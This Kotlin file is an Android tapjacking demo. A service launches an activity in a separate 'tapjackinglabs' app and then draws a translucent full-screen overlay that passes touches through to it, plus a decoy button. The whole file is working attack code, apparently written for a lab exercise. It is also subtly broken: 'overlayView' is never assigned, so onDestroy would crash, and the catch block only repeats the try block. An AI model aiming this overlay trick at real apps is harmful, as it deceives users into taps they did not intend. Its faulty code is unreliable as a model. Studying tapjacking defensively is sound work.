package com.tapjacking.demo


import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager


class OverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onCreate() {
        super.onCreate()
        // 1. Launch the external activity
        try {
            val externalIntent = Intent()
            externalIntent.setClassName("com.example.tapjackinglabs", "com.example.tapjackinglabs.MainActivity")
            externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
            startActivity(externalIntent)
        } catch (e: Exception) {
            val externalIntent = Intent()
            externalIntent.setClassName("com.example.tapjackinglabs", "com.example.tapjackinglabs.MainActivity")
            externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
            startActivity(externalIntent)
        }

        // 2. Delay the presentation of the tapjacking view to give time for the activity to launch
        Handler().postDelayed({
            setupTapjackingView()
        }, 1000) // 1 second delay. Adjust as needed.
    }

    private fun setupTapjackingView() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        val inflater = getSystemService(LAYOUT_INFLATER_SERVICE) as LayoutInflater

        // Fullscreen overlay with semi-transparent background
        val fullOverlay = inflater.inflate(R.layout.full_overlay, null)
        val fullParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            },
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )
        windowManager.addView(fullOverlay, fullParams)

        // Button overlay, touchable and allows touches outside of it
        val btn = inflater.inflate(R.layout.sample_button, null)
        val btnParams = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            },
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT
        )
        btnParams.gravity = Gravity.BOTTOM
        windowManager.addView(btn, btnParams)

        btn.setOnClickListener { stopSelf() }
    }

    override fun onDestroy() {
        super.onDestroy()
        windowManager.removeView(overlayView)
    }
}